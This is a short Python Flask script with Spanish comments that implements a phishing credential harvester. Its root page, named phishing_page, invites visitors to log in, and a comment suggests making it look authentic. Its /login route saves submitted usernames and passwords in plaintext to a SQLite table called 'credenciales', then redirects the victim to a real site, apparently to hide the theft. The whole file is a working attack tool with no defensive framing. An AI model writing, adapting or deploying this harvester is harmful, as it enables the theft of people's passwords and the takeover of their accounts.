import sqlite3
from flask import Flask, redirect, request

app = Flask(__name__)

# Establecer conexión con la base de datos
conn = sqlite3.connect('credenciales.db')
cursor = conn.cursor()

# Crear la tabla para almacenar las credenciales
cursor.execute('''CREATE TABLE IF NOT EXISTS credenciales
                (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT,
                 password TEXT)''')
conn.commit()

@app.route('/')
def phishing_page():
    # Aquí puedes personalizar el contenido para que parezca auténtico
    return '¡Has sido redirigido a la página de inicio de sesión! Ingresa tus credenciales.'

@app.route('/login', methods=['POST'])
def login():
    # Obtener las credenciales enviadas por el usuario
    username = request.form['username']
    password = request.form['password']

    # Insertar las credenciales en la base de datos
    cursor.execute("INSERT INTO credenciales (username, password) VALUES (?, ?)", (username, password))
    conn.commit()

    # Redirigir al usuario a una página real después de capturar las credenciales
    return redirect('https://Algebraix.com')

if __name__ == '__main__':
    app.run()